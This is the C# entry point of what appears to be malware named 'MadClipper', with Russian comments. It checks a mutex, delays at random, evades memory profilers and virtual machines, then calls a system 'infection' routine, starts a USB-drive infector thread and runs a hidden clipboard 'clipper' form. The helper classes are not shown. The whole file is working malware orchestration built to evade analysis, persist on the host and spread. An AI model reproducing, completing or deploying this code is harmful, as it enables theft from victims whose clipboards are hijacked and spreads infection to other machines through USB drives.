using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace MadClipper
{
    class Program
    {
        [STAThread]
        static void Main(string[] args)
        {
            // Проверка MutEx
            if (!MutEx.Check())
            {
                Environment.Exit(0);
            }
            else
            {
                // Sleep
                Thread.Sleep(new Random(Environment.TickCount).Next(500, 5500));

                // Защита от dotMemory
                Protection.Initialize();

                // Проверяем на запуск виртуальных машин ( Virtual Machine Check )
                if (!AntiVM.CheckVM())
                {
                    // System infection
                    Installer.Infection();


                    // USB Detector > Infector
                    new Thread(() =>
                    {
                        Thread.Sleep(new Random(Environment.TickCount).Next(500, 5500));
                        UsbInfector.Initialize();
                    }).Start();

                    // Clipper 
                    new BackgroundForm();
                    Application.Run();
                }
                else
                {
                    Environment.Exit(0);
                }

            }
        }
    }
}
